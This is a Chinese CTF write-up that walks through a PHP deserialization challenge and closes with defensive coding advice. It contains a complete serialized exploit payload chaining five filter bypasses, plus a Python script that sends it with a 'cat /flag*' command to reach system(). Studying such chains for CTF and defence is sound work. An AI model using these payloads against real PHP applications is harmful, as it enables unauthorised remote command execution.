---
title: "PHP反序列化CTF实战：五重绕过技巧从入门到拿Flag"
date: 2026-05-28 10:00:00 +0800
author: Security Researcher
categories: [Web安全, CTF]
tags: [PHP反序列化, CTF, 绕过技巧, Fast-Destruct, __PHP_Incomplete_Class, POP链, Web安全]
description: 一道PHP反序列化CTF题的完整解题思路——从重复数组键触发析构、布尔值绕过字符串过滤、__PHP_Incomplete_Class绕过类名检测，到最终构造完整Payload拿Flag。每一步都有新手能看懂的详细解释。
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。未经授权对他人系统进行渗透测试属于违法行为。

## 目录
- [题目概述](#题目概述)
- [题目代码还原](#题目代码还原)
- [攻击链总览](#攻击链总览)
- [难点一：析构函数输出看不见 - 重复数组键触发 Fast-Destruct](#难点一析构函数输出看不见--重复数组键触发-fast-destruct)
- [难点二：username 等于 admin - 布尔值 true 绕过](#难点二username-等于-admin--布尔值-true-绕过)
- [难点三：过滤器禁止 Access 冒号引号 - __PHP_Incomplete_Class 绕过](#难点三过滤器禁止-access-冒号引号-__php_incomplete_class-绕过)
- [难点四：exec 中的两个条件 - 序列化往返](#难点四exec-中的两个条件--序列化往返)
- [难点五：让 getToken 调用 getFlag - 静态方法调用数组](#难点五让-gettoken-调用-getflag--静态方法调用数组)
- [完整 Payload 构造](#完整-payload-构造)
- [攻击脚本](#攻击脚本)
- [五大技巧速查卡](#五大技巧速查卡)
- [防御措施](#防御措施)
- [参考资源](#参考资源)
- [总结](#总结)

---

## 题目概述

这道 CTF 题目的核心任务是：**向服务器发送一段精心构造的序列化数据，让服务器在反序列化后执行 `system('cat /flag*')`，从而拿到 flag。**

听起来简单？但题目设置了 **五重障碍**，每一重都需要特定的技巧来绕过：

| 障碍 | 问题描述 | 绕过技巧 |
|------|---------|---------|
| 1 | 异常导致析构函数输出被吞 | 重复数组键（Fast-Destruct） |
| 2 | `$username` 必须等于 `"admin"` | 布尔值 `true` 绕过松散比较 |
| 3 | 过滤器禁止 `Access":` 出现 | `__PHP_Incomplete_Class` 伪装 |
| 4 | `exec()` 中有两个条件检查 | 序列化往返使类名变化 |
| 5 | `getToken()` 需要调用 `getFlag()` | 静态方法调用数组 |

下面我们一步步拆解。如果你对 PHP 反序列化的基础知识还不太了解，建议先阅读 [PHP反序列化漏洞完全指南](/posts/php-deserialization-vulnerability/) 这篇原理文章。

---

## 题目代码还原

先来看完整的题目代码，我会用注释标注每个关键位置：

```php
<?php
class Access {
    public $action;

    public function getToken() {
        $cb = $this->action;       // 把 $action 当作可调用对象
        return $cb();              // 执行它
    }

    public function getFlag() {
        system($_GET["cmd"]);      // 🎯 最终目标：执行系统命令
    }
}

class User {
    public $username;
    public $value;

    public function exec() {
        // 第一步：对 $value 做一次"反序列化→再序列化"的往返操作
        $ser = serialize(unserialize($this->value));
        var_dump($ser);

        // 第二步：对往返后的结果再做一次反序列化
        $instance = unserialize($ser);

        // 第三步：两个条件都满足才执行 include
        if ($ser != $this->value && $instance instanceof Access) {
            include($instance->getToken());  // 调用 Access 的 getToken()
        }
    }

    public function __destruct() {
        if ($this->username == "admin") {    // ⚠️ 障碍2：需要 username 等于 "admin"
            $this->exec();
        }
    }
}

// ⚠️ 障碍3：字符串过滤
if (strpos($ser, "admin") !== false && strpos($ser, "Access\":") !== false) {
    exit("no way!!!!");
}

// 反序列化用户输入
$user = unserialize($_POST["user"]);

// ⚠️ 障碍1：强制抛出异常，脚本终止
throw new Exception("nonono!!!");
?>
```

**攻击目标**：让程序执行到 `Access::getFlag()`，进而通过 `system($_GET["cmd"])` 读取 flag。

---

## 攻击链总览

在逐个拆解难点之前，先看完整的攻击链路，建立全局视角：

```
┌─────────────────────────────────────────────────────────────┐
│                      完整攻击链路                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ① 发送序列化数组（含重复键）                                 │
│     ↓                                                       │
│  ② PHP 反序列化时，重复键导致 User 对象被覆盖                  │
│     ↓                                                       │
│  ③ User 对象引用计数归零，立即触发 __destruct()  [绕过障碍1]  │
│     ↓                                                       │
│  ④ __destruct() 检查 username == "admin"                    │
│     → username = true，松散比较通过           [绕过障碍2]     │
│     ↓                                                       │
│  ⑤ 调用 exec()，对 $value 做序列化往返                       │
│     → 类名从 "A" 变为 "Access"               [绕过障碍3+4]   │
│     ↓                                                       │
│  ⑥ 两个条件通过，调用 $instance->getToken()                  │
│     ↓                                                       │
│  ⑦ getToken() 执行 $this->action()                          │
│     → action = ["Access","getFlag"]          [绕过障碍5]     │
│     ↓                                                       │
│  ⑧ 执行 system($_GET["cmd"]) → 拿到 Flag 🎉                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

下面逐个拆解每个难点。

---

## 难点一：析构函数输出看不见 - 重复数组键触发 Fast-Destruct

### 问题在哪

代码最后一行：

```php
throw new Exception("nonono!!!");
```

这行代码会在反序列化完成后**立即抛出异常**，脚本终止。

正常情况下，对象的析构函数 `__destruct()` 是在脚本**彻底结束时**才运行的。但此时异常信息已经输出，你只能看到 `nonono!!!`，析构函数里的任何输出（比如 flag）都看不到。

### 解决思路

我们需要让 `__destruct()` **在异常抛出之前**就被调用。怎么做到？利用 PHP 反序列化的一个特性——**数组重复键**。

### 原理详解

当 PHP 反序列化一个数组时，如果出现两个相同的数字索引，**后一个会覆盖前一个**。原来的对象因为引用计数变为 0，会**立即**触发析构函数，而不是等到脚本结束。

举个直观的例子：

```plaintext
a:2:{i:0;O:4:"User":...;i:0;b:0;}
```

解析过程：
1. 遇到 `i:0`，把 `User` 对象放入数组索引 0
2. 又遇到 `i:0`，用布尔值 `b:0`（false）覆盖索引 0
3. 原来的 `User` 对象被丢弃，**立刻**调用 `__destruct()`
4. 此时异常还没抛出，所以 `exec()` 里的输出都能正常显示

### 新手理解

你可以把这个过程想象成"抢座位"：

- 第一个人坐了 0 号座位（User 对象）
- 第二个人也要坐 0 号座位（布尔值 false）
- 第一个人被赶走了，立刻触发"退场流程"（`__destruct()`）
- 而"火灾警报"（异常）还没响，所以退场流程里的广播还能被听到

### 序列化格式

```plaintext
a:2:{i:0;<User对象>;i:0;b:0;}
```

- `a:2:` — 数组，有2个元素
- `i:0;` — 第一个元素的键是整数 0
- `<User对象>` — 值是 User 对象
- `i:0;` — 第二个元素的键**也是**整数 0（重复！）
- `b:0;` — 值是布尔值 false

---

## 难点二：username 等于 admin - 布尔值 true 绕过

### 问题在哪

`__destruct()` 方法里有这个判断：

```php
if ($this->username == "admin") {
    $this->exec();
}
```

如果直接把 `username` 设为字符串 `"admin"`，那么序列化后的字符串里就会包含 `admin` 这个子串，可能触发过滤器。

### 关键知识：PHP 松散比较

PHP 有两种比较运算符：

| 运算符 | 名称 | 含义 |
|--------|------|------|
| `==` | 松散比较 | 比较前会做**类型转换** |
| `===` | 严格比较 | 类型不同直接返回 false |

在松散比较中，当布尔值 `true` 和字符串 `"admin"` 比较时：

```php
<?php
var_dump(true == "admin");   // bool(true)  ✅
var_dump(true === "admin");  // bool(false) ❌
?>
```

**原因**：非空字符串 `"admin"` 会被转换为布尔值 `true`，所以 `true == true` 成立。

### 解决方案

把 `$username` 设为布尔值 `true`，而不是字符串 `"admin"`：

- 过滤器检查的是字符串里有没有 `"admin"` 这个子串
- 布尔值 `true` 的序列化形式是 `b:1;`，里面根本不包含 `"admin"` 四个字母
- 但 `true == "admin"` 为真，条件照样通过

### 序列化表示

```plaintext
s:8:"username";b:1;    // b:1 表示布尔值 true
```

对比如果用字符串：

```plaintext
s:8:"username";s:5:"admin";    // 包含 "admin"，可能被过滤
```

---

## 难点三：过滤器禁止 Access 冒号引号 - __PHP_Incomplete_Class 绕过

### 问题在哪

代码中有这样的过滤逻辑：

```php
if (strpos($ser, "admin") !== false && strpos($ser, "Access\":") !== false) {
    exit("no way!!!!");
}
```

它检查你的整个序列化字符串里**不能同时**包含 `"admin"` 和 `Access":`（注意是 `Access` 后面紧跟引号和冒号）。

虽然我们已经用 `true` 绕过了 `"admin"` 的检查，但后面构造 `Access` 对象时，标准的序列化字符串中**必然**包含 `Access":`：

```plaintext
O:6:"Access":1:{s:6:"action";...}
         ^^^^^^^^
         这里就是 Access":
```

### 关键知识：`__PHP_Incomplete_Class`

`__PHP_Incomplete_Class` 是 PHP 的一个特殊机制：当反序列化一个**不存在的类**时，PHP 不会报错，而是创建一个 `__PHP_Incomplete_Class` 的实例来"兜底"。

更重要的是：**当你对这个实例再次执行 `serialize()` 时，PHP 会根据 `__PHP_Incomplete_Class_Name` 属性的值来"修复"类名**，输出标准的序列化字符串。

### 解决方案

我们用一个**不存在的类名**（比如 `"A"`）来构造序列化字符串，同时在里面放一个特殊属性 `__PHP_Incomplete_Class_Name`，值设为 `"Access"`：

```plaintext
O:1:"A":2:{s:27:"__PHP_Incomplete_Class_Name";s:6:"Access";s:6:"action";...}
```

**为什么能绕过过滤器？**

仔细看这个字符串，类名部分是 `O:1:"A":`，里面没有 `Access":`。`Access` 这个词只出现在属性值中，形式是 `s:6:"Access";`，后面跟的是分号和引号，不是冒号，所以 `strpos($ser, "Access\":")` 不会命中。

### 新手理解

你可以把这个过程想象成"伪装快递"：

- 你要寄一个包裹，但安检不允许"Access牌"的包裹通过
- 于是你把包裹贴上"A牌"的标签，里面夹一张纸条写着"我其实是Access牌的"
- 安检只看外面的标签，放行了
- 到了目的地，工作人员看到纸条，把标签改回"Access牌"，按正常流程处理

### 反序列化过程详解

```plaintext
输入:  O:1:"A":2:{s:27:"__PHP_Incomplete_Class_Name";s:6:"Access";s:6:"action";a:2:{...}}
  ↓
PHP 反序列化时发现类 "A" 不存在
  ↓
创建 __PHP_Incomplete_Class 实例，__PHP_Incomplete_Class_Name = "Access"
  ↓
对这个实例执行 serialize()，PHP "修复"类名
  ↓
输出: O:6:"Access":1:{s:6:"action";a:2:{...}}
```

注意第二次序列化时，属性数量从 2 变成了 1——因为 `__PHP_Incomplete_Class_Name` 是特殊属性，不会被当作普通属性序列化出来。

---

## 难点四：exec 中的两个条件 - 序列化往返

### 问题在哪

`exec()` 方法里有这段代码：

```php
$ser = serialize(unserialize($this->value));
var_dump($ser);
$instance = unserialize($ser);

if ($ser != $this->value && $instance instanceof Access) {
    include($instance->getToken());
}
```

两个条件必须**同时满足**：

1. `$ser != $this->value` — 往返后的字符串和原始字符串不同
2. `$instance instanceof Access` — 第二次反序列化得到的是真正的 `Access` 对象

### 条件1：`$ser != $this->value`

- `$this->value` 是我们构造的 `O:1:"A":2:{...}`（类名是 `"A"`）
- `unserialize($this->value)` 得到一个 `__PHP_Incomplete_Class` 对象
- `serialize()` 它得到 `O:6:"Access":1:{...}`（类名变成了 `"Access"`，属性数从 2 变成 1）

新旧两个字符串明显不同，条件满足 ✅

### 条件2：`$instance instanceof Access`

- `$instance = unserialize($ser)`，这里的 `$ser` 已经是标准的 `Access` 类序列化结果
- 反序列化后得到的是**真正的 `Access` 对象**
- `instanceof Access` 为真 ✅

### 新手理解

这个过程就像"护照验证"：

1. 你拿着一张"A国"的护照入境（第一次反序列化），系统发现 A 国不存在，给你发了个临时身份
2. 你用临时身份重新办了一张护照（序列化），系统根据你声明的信息，给你办了"Access国"的正式护照
3. 你拿着正式护照再次入境（第二次反序列化），这次系统认你了，`instanceof Access` 通过

---

## 难点五：让 getToken 调用 getFlag - 静态方法调用数组

### 问题在哪

两个条件通过后，代码会执行：

```php
include($instance->getToken());
```

`getToken()` 的代码是：

```php
public function getToken() {
    $cb = $this->action;
    return $cb();
}
```

它把 `$action` 当作一个**可调用对象（callable）**来执行。我们需要让 `$action` 指向 `Access::getFlag()` 这个方法。

### 关键知识：PHP 可调用结构

PHP 中有多种方式表示"可调用的东西"：

| 形式 | 含义 | 示例 |
|------|------|------|
| 字符串 | 普通函数 | `"system"` |
| 数组（类名+方法名） | 静态方法调用 | `["Access", "getFlag"]` |
| 数组（对象+方法名） | 实例方法调用 | `[$obj, "getMethod"]` |
| 闭包 | 匿名函数 | `function() { ... }` |

我们要调用 `Access::getFlag()` 这个静态方法，所以用 `["Access", "getFlag"]` 这种数组形式。

### 解决方案

把 `$action` 设为：

```plaintext
a:2:{i:0;s:6:"Access";i:1;s:7:"getFlag";}
```

这样 `$cb()` 就会执行 `Access::getFlag()`，而 `getFlag()` 又会执行 `system($_GET["cmd"])`。

### cmd 参数怎么传

注意 `getFlag()` 的代码是 `system($_GET["cmd"])`，它从 **URL 查询参数** 中读取命令，而不是从 POST 数据中读取。所以发送请求时，命令要放在 URL 参数里：

```plaintext
http://target/?cmd=cat /flag*
```

---

## 完整 Payload 构造

现在把所有技巧组合起来，一步步构造最终的 Payload。

### 第一步：构造内层序列化（`$this->value` 的值）

这是 `Access` 对象的"伪装版"，类名用 `"A"` 代替 `"Access"`：

```plaintext
O:1:"A":2:{s:27:"__PHP_Incomplete_Class_Name";s:6:"Access";s:6:"action";a:2:{i:0;s:6:"Access";i:1;s:7:"getFlag";}}
```

逐段解释：

| 片段 | 含义 |
|------|------|
| `O:1:"A":2:` | 对象，类名 "A"，2个属性 |
| `s:27:"__PHP_Incomplete_Class_Name"` | 特殊属性名（27个字符） |
| `s:6:"Access"` | 属性值：真实类名 "Access" |
| `s:6:"action"` | Access 类的 $action 属性 |
| `a:2:{i:0;s:6:"Access";i:1;s:7:"getFlag";}` | 静态方法调用数组 ["Access","getFlag"] |

计算这个字符串的长度：**114 个字符**（后面需要用到）。

### 第二步：构造外层的 User 对象

```plaintext
O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:114:"<第一步的字符串>";}
```

逐段解释：

| 片段 | 含义 |
|------|------|
| `O:4:"User":2:` | 对象，类名 "User"，2个属性 |
| `s:8:"username";b:1;` | username = true（绕过 "admin" 过滤） |
| `s:5:"value";s:114:"...";` | value = 内层序列化字符串（长度114） |

**⚠️ 重要**：`s:114:` 中的数字必须和内层字符串的实际长度完全一致，否则 PHP 反序列化会失败。

### 第三步：用重复数组键包装（触发 Fast-Destruct）

```plaintext
a:2:{i:0;<User对象>;i:0;b:0;}
```

把 User 对象放进数组的索引 0，然后用布尔值 false 覆盖同一个索引，迫使 User 对象立即被销毁。

### 完整 Payload

把以上三步拼在一起，最终发送的 `user` 参数值为：

```plaintext
a:2:{i:0;O:4:"User":2:{s:8:"username";b:1;s:5:"value";s:114:"O:1:"A":2:{s:27:"__PHP_Incomplete_Class_Name";s:6:"Access";s:6:"action";a:2:{i:0;s:6:"Access";i:1;s:7:"getFlag";}}";}i:0;b:0;}
```

---

## 攻击脚本

用 Python 发送请求的完整脚本：

{% raw %}
```python
import requests

inner = 'O:1:"A":2:{s:27:"__PHP_Incomplete_Class_Name";s:6:"Access";s:6:"action";a:2:{i:0;s:6:"Access";i:1;s:7:"getFlag";}}'

user_obj = f'O:4:"User":2:{{s:8:"username";b:1;s:5:"value";s:{len(inner)}:"{inner}";}}'

payload = f'a:2:{{i:0;{user_obj}i:0;b:0;}}'

url = 'http://target-ip:port/'

r = requests.post(url, params={'cmd': 'cat /flag*'}, data={'user': payload})

print(r.text)
```
{% endraw %}

**关键说明**：

1. `params={'cmd': 'cat /flag*'}` — 命令通过 **URL 参数** 传递，因为 `getFlag()` 用的是 `$_GET["cmd"]`
2. `data={'user': payload}` — 序列化数据通过 **POST 请求体** 传递
3. `f'...{{...}}...'` — Python f-string 中双花括号 `{{` 和 `}}` 表示字面量花括号

---

## 五大技巧速查卡

| # | 障碍 | 技巧 | 核心原理 | 序列化关键 |
|---|------|------|---------|-----------|
| 1 | 异常吞掉析构输出 | 重复数组键（Fast-Destruct） | 同索引覆盖导致引用计数归零，立即触发 `__destruct()` | `a:2:{i:0;<obj>;i:0;b:0;}` |
| 2 | `$username == "admin"` | 布尔值 `true` | PHP 松散比较：`true == "admin"` 为真 | `s:8:"username";b:1;` |
| 3 | 过滤 `Access":` | `__PHP_Incomplete_Class` | 用不存在的类名伪装，序列化时 PHP 自动修复类名 | `O:1:"A":2:{...__PHP_Incomplete_Class_Name...}` |
| 4 | `exec()` 两个条件 | 序列化往返 | 类名从 "A" 变为 "Access"，字符串不同且 `instanceof` 为真 | `serialize(unserialize($value))` |
| 5 | `getToken()` 调用 `getFlag()` | 静态方法调用数组 | PHP callable 语法：`["类名","方法名"]` | `a:2:{i:0;s:6:"Access";i:1;s:7:"getFlag";}` |

---

## 防御措施

从开发者的角度，这道题暴露了多个安全问题。以下是针对性的防御建议：

### 1. 永远不要反序列化用户输入

```php
<?php
// 危险
$user = unserialize($_POST["user"]);

// 安全：使用 JSON
$user = json_decode($_POST["user"], true);

// 如果必须反序列化，限制允许的类
$user = unserialize($_POST["user"], ["allowed_classes" => false]);
?>
```

### 2. 使用严格比较

```php
<?php
// 危险：松散比较，true == "admin" 为真
if ($this->username == "admin") { ... }

// 安全：严格比较，true === "admin" 为假
if ($this->username === "admin") { ... }
?>
```

### 3. 不要在魔术方法中执行危险操作

```php
<?php
// 危险：析构函数中执行系统命令
public function __destruct() {
    system($this->cmd);
}

// 安全：析构函数只做清理工作
public function __destruct() {
    $this->closeConnection();
}
?>
```

### 4. 字符串过滤不可靠

```php
<?php
// 危险：基于字符串的过滤容易被绕过
if (strpos($ser, "Access\":") !== false) { exit; }

// 安全：使用 allowed_classes 白名单
$obj = unserialize($data, ["allowed_classes" => ["SafeClass"]]);
?>
```

### 5. 避免可变函数调用

```php
<?php
// 危险：$action 可被控制
$cb = $this->action;
return $cb();

// 安全：使用白名单
$allowed = ["getToken", "getInfo"];
if (in_array($this->action, $allowed, true)) {
    return $this->{$this->action}();
}
?>
```

---

## 参考资源

- [PHP反序列化漏洞完全指南](/posts/php-deserialization-vulnerability/) — 本博客的原理篇，建议搭配阅读
- [PHP官方文档 - 序列化](https://www.php.net/manual/zh/language.oop5.serialization.php)
- [PHP官方文档 - 类型比较表](https://www.php.net/manual/zh/types.comparisons.php)
- [PayloadsAllTheThings - PHP Serialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization/PHP)
- [PHPGGC - PHP Gadget Chain Generator](https://github.com/ambionics/phpggc)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PortSwigger - Insecure Deserialization](https://portswigger.net/web-security/deserialization)

---

## 总结

这道题巧妙地将五个独立的 PHP 特性串联在一起，形成了一条完整的攻击链：

1. **重复数组键** — 让对象在反序列化中途被销毁，提前触发析构函数，逃过异常的输出屏蔽
2. **布尔值 true** — 利用 PHP 松散比较的特性，绕过 `"admin"` 字符串过滤
3. **`__PHP_Incomplete_Class`** — 用不存在的类名作为外壳，里面藏真实的类名，绕过 `Access":` 的字符串匹配
4. **序列化往返** — 输入类 "A"，输出类 "Access"，使得 `$ser != $this->value` 且 `instanceof Access` 为真
5. **静态调用数组** — `["Access","getFlag"]` 让 `getToken()` 执行目标函数

**核心教训**：PHP 的灵活性（松散比较、可变函数、`__PHP_Incomplete_Class` 等）在带来便利的同时，也带来了安全隐患。作为开发者，应该使用严格比较、白名单机制、避免反序列化用户输入，才能从根本上防止此类攻击。

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年5月28日*
